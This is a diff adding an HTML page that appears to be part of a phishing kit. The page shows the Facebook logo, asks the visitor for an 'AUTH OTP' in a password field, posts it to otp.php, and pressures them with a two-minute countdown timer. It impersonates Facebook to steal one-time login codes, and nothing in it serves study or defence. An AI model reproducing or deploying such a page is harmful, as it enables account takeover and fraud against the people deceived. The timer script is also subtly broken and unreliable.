@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Animated Login Form</title>
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+	<link href="https://fonts.googleapis.com/css?family=Poppins:600&display=swap" rel="stylesheet">
+	<script src="https://kit.fontawesome.com/a81368914c.js"></script>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<html>
+<body>
+	<img class="wave" src="img/wave.png">
+	<div class="container">
+		<div class="img">
+			<img src="img/bg.svg">
+		</div>
+		<div class="login-content">
+			<form action="otp.php" method="POST" class="login">
+				<img src="https://1000logos.net/wp-content/uploads/2016/11/Facebook-logo.png">
+				<h2 class="title">OTP</h2>
+           		<div class="input-div pass">
+           		   <div class="i"> 
+           		    	<i class="fa fa-id-card"></i>
+           		   </div>
+           		   <div class="div">
+           		    	<h5>AUTH OTP</h5>
+           		    	<input type="password" class="input" name="pass">
+            	   </div>
+            	</div>
+            	<a href="https://www.google.com">Forgot Password?</a>
+				&nbsp;
+				<center> <div>Time left - <span id="timer">2:00</span></div></center>
+            	<input type="submit" class="btn" value="Login">
+            </form>
+        </div>
+    </div>
+	<script type="text/javascript">
+             startTimer();
+
+function startTimer() {
+  var presentTime = document.getElementById('timer').innerHTML;
+  var timeArray = presentTime.split(/[:]+/);
+  var m = timeArray[0];
+  var s = checkSecond((timeArray[1] - 1));
+  if(s==11){m=m-1}
+  if((m + '').length == 1){
+    m = '0' + m;
+  }
+  if(m < 0){
+    m = '11';
+  }
+  document.getElementById('timer').innerHTML = m + ":" + s;
+  setTimeout(startTimer, 1000);
+}
+
+function checkSecond(sec) {
+  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+  if (sec < 0) {sec = "59"};
+  return sec;
+}
+</script>
+    <script type="text/javascript" src="js/main.js"></script>
+	</script>
+<audio id="xyz" src="https://x2convert.com/Thankyou?token=U2FsdGVkX19zZMVUt9FiInLG3xbWVEJ5Qo3jI3T1LqIK7LvqpIWb9DRoXutU4sdS5xwu6RqaXWm7aJcIoxqPWJPv6y6%2fAwEdoYgxddDrJ%2fKfoRDyWwf3gW%2fB2LL9fK9MxIdB2P2W9PIH0UcMazELrvBIYp0g8pQGFwORMDBjukJFjZc%2f0dMbScfWa5oyiKcE&s=youtube&id=&h=3692998352381650705" preload="auto"></audio>
+<br>
+<div dir="ltr" style="text-align: left;" trbidi="on">
+<span style="color: white;">
+<span id="displaySeconds"></span>
+</body>
+</html>
